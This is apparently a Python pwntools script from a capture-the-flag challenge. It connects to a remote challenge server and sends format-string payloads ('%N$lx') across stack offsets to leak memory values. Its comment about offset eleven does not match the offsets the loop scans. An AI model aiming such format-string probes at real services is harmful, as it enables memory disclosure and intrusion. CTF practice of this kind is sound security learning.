from pwn import *

def exploit():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (22, 30):
        try:
            # p = process("./sao")
            p = remote("chall.kbti.tech", 9999)
            
            print "Offset number {}".format(x)

            payload = ""
            payload += "%{}$lx".format(x)

            p.sendlineafter("Username: ", payload)
            p.sendlineafter("Password: ", "A")

            p.recvuntil("-----------------------------------------\n")

            stack_value = p.recvuntil(" ")

            print "Stack value: {}".format(stack_value)

            p.close()
        except:
            pass
            

if __name__ == "__main__":
    exploit()